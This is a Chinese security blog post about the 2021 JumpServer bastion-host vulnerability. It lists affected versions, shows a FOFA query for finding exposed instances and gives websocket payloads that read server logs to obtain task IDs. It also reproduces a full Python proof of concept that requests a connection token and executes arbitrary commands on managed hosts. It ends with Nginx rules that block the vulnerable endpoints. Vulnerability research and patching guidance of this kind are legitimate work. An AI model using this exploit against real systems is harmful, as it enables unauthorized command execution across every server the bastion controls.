> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MIP43dVMfAUgsiwjzSFgHw)

0x00 概述
=======

JumpServer 是全球首款开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 规范的运维安全审计系统。
===============================================================

2021 年 1 月 15 日，JumpServer 发布更新修复了一个远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关 API 操作控制其中所有机器，执行任意命令。
===========================================================================================================================

参考链接：https://github.com/jumpserver/jumpserver/blob/master/README.md
===================================================================

0x01 影响范围
=========

受影响版本：

·       < v2.6.2

·       < v2.5.4

·       < v2.4.5

·       = v1.5.9

不受影响版本：

·       >= v2.6.2

·       >= v2.5.4

·       >= v2.4.5

·       = v1.5.9 （版本号没变）

0x02 漏洞复现
=========

环境搭建
----

在 CentOS7 系统下执行如下命令即可进行快速安装：

| 

curl -sSL https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh  | sh

 |

完成后进入安装目录 /opt/jumpserver-installer-v2.6.1，执行如下命令即可启动 jumpserver：

| 

./jmsctl.sh start

 |

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibPaGHmTufJJUyKaQM9hX55sbsp3VtDnEYWsM070CboyWAV82Kib9OG2ibHq59jse8gpMPG09SBEX78g/640?wx_fmt=png)

访问默认端口 8080 即可进入后台：

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibPaGHmTufJJUyKaQM9hX55sTyPoNNCBgMSIrQPjYibNhwABI3l1ERty6cKC2jDiamCWSDicdFB4iaic5vw/640?wx_fmt=png)

详细的安装教程可参考官方文档：https://docs.jumpserver.org/zh/master/install/setup_by_fast/

互联网资产搜索
-------

在 fofa 中通过搜索关键字：title="jumpserver"，可以搜索到运行在互联网上的 jumpserver

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibPaGHmTufJJUyKaQM9hX55sU0cTrTmyLMWa1tc8pRAoHaYu0yj0aNpVnwVGvpgW5OP3vFwHXL5Jdw/640?wx_fmt=png)

0x03 复现
-------

通过对比修复前后的源码，发现左边的代码在接受连接之前做了是否已经登录和是否是管理员的判断，而右边未修复的代码则没有任何判断默认接受所有连接，因此旧版本的 websocket 可以进行未授权连接。

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibPaGHmTufJJUyKaQM9hX55sguV3SGrd3OpDsRwKqnlRuKiaqlz64ibuqWpoJoCuqn5UfIqa6z4q6l7g/640?wx_fmt=png)

连接 websocket 可以用 Chrome 插件 websocket-test-client，同时提供一个好用的在线版 websocket 测试工具：http://coolaf.com/tool/chattest

通过该漏洞可以获取 token，漏洞出现在 websocket 处，通过如下接口可以读取服务端日志：

| 

ws://xx.xx.xx.xx:8080/ws/ops/tasks/log/

{"task":"/opt/jumpserver/logs/jumpserver"}

 |

在返回信息中可获取 Taskid。

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibPaGHmTufJJUyKaQM9hX55sibDzQoJpohWUQyspW8sahiahtHuZ5R3lQSGDfJSibd0lcwSBApqmKbU3g/640?wx_fmt=png)

利用上一步得到的 Taskid，可进行进一步的信息获取，将 Taskid 值 send 给接口，即可查看到当前任务的详细信息。

| 

{"task":"dc0533d8-078a-47c0-b554-01f368a89a19"}

 |

可能有些小伙伴在复现读取 Taskid 信息是没有成功，我也一样，研究了一晚上发现我们未授权读取的其实是日志文件，我们获取到的内容取决于日志记录的内容，一些 Taskid 可能已经失效了，在进行测试的时候可以看一下当前 Taskid 对应的时间，过于久远的 id 肯定是无法获取详情的。

同理也能解释为什么在很多次测试中没有搜索到 system_user 这个字段，如果在实战中运气足够好，正好赶上管理员登陆了系统未退出，在日志中获取到 system_user、user、asset 这三个字段，则可以 RCE。已经有大佬写好了 PoC，在 PoC 中替换 system_user、user、asset 为我们获取的值，即可成功执行命令（参考：https://www.o2oxy.cn/2921.html）：

| 

# -*- coding:  utf-8 -*-

# import requests

# import json

# data={"user":"4320ce47-e0e0-4b86-adb1-675ca611ea0c","asset":"ccb9c6d7-6221-445e-9fcc-b30c95162825","system_user":"79655e4e-1741-46af-a793-fff394540a52"}

#

#  url_host='http://192.168.1.73:8080'

#

# def get_token():

#     url = url_host+'/api/v1/users/connection-token/?user-only=1'

#     url  =url_host+'/api/v1/authentication/connection-token/?user-only=1'

#     response = requests.post(url,  json=data).json()

#     print(response)

#      ret=requests.get(url_host+'/api/v1/authentication/connection-token/?token=%s'%response['token'])

#     print(ret.text)

# get_token()

import asyncio

import websockets

import requests

import json

url =  "/api/v1/authentication/connection-token/?user-only=None"

# 向服务器端发送认证后的消息

async def send_msg(websocket,_text):

    if _text == "exit":

        print(f'you have enter"exit", goodbye')

        await  websocket.close(reason="user exit")

        return False

    await websocket.send(_text)

    recv_text = await websocket.recv()

    print(f"{recv_text}")

# 客户端主逻辑

async def main_logic(cmd):

    print("#######start ws")

    async with websockets.connect(target) as  websocket:

        recv_text = await websocket.recv()

        print(f"{recv_text}")

        resws=json.loads(recv_text)

        id = resws['id']

        print("get ws id:"+id)

        print("###############")

        print("init ws")

        print("###############")

        inittext =  json.dumps({"id": id, "type": "TERMINAL_INIT",  "data":  "{\"cols\":164,\"rows\":17}"})

        await send_msg(websocket,inittext)

        for i in range(20):

            recv_text = await  websocket.recv()

            print(f"{recv_text}")

        print("###############")

        print("exec cmd: ls")

        cmdtext = json.dumps({"id":  id, "type": "TERMINAL_DATA", "data":  cmd+"\r\n"})

        print(cmdtext)

        await send_msg(websocket, cmdtext)

        for i in range(20):

            recv_text = await  websocket.recv()

            print(f"{recv_text}")

        print('#######finish')

if __name__ == '__main__':

    try:

        import sys

        host=sys.argv[1]

        cmd=sys.argv[2]

        if host[-1]=='/':

            host=host[:-1]

        print(host)

        data = {"user":  "4320ce47-e0e0-4b86-adb1-675ca611ea0c", "asset":  "ccb9c6d7-6221-445e-9fcc-b30c95162825",

                "system_user":  "79655e4e-1741-46af-a793-fff394540a52"}

        print("##################")

        print("get token url:%s" %  (host + url,))

        print("##################")

        res = requests.post(host + url,  json=data)

        token = res.json()["token"]

        print("token:%s", (token,))

        print("##################")

        target = "ws://" +  host.replace("http://", '') +"/koko/ws/token/?target_id=" + token

        print("target ws:%s" %  (target,))

         asyncio.get_event_loop().run_until_complete(main_logic(cmd))

    except:

        print("python jumpserver.py  http://192.168.1.73 whoami")

 |

0x04 防护方案
=========

在官方发布的最新版本中已经修复了该漏洞，请受影响的用户及时进行更新。

对于不方便更新的用户，官方还提供了临时防护方案：

修改 Nginx 配置文件，以屏蔽漏洞接口：

| 

/api/v1/authentication/connection-token/

/api/v1/users/connection-token/

 |

Nginx 配置文件位置如下：

| 

社区老版本

/etc/nginx/conf.d/jumpserver.conf

# 企业老版本

jumpserver-release/nginx/http_server.conf

# 新版本在

jumpserver-release/compose/config_static/http_server.conf

Nginx 配置文件实例为：

### 保证在 /api 之前和 / 之前

location  /api/v1/authentication/connection-token/ {

   return 403;

}

location  /api/v1/users/connection-token/ {

   return 403;

}

### 新增以上这些

location /api/ {

    proxy_set_header X-Real-IP $remote_addr;

    proxy_set_header Host $host;

    proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;

    proxy_pass http://core:8080;

   }

……

 |

修改配置文件完毕后，重启 Nginx 服务即可。

END

十九线菜鸟学安全∣微信公众号

![](https://mmbiz.qpic.cn/mmbiz_jpg/IlslviaDrQibPaGHmTufJJUyKaQM9hX55sJRVxKsk8lP2ZWAHLVDKkqGfXg2WOJHLAbPYdFAibC9RsRqwONI0d4dw/640?wx_fmt=jpeg)  ![](https://mmbiz.qpic.cn/mmbiz/Hu8hctxHqSW0nSJn8p8OHVEQwHicSwTibFJMBE650AxdzfISoeY8woe2QsgCINIBrccBOOUft2HuU0GsNQWibSG7g/640?wx_fmt=png)

长按识别二维码，期待与大家交流心得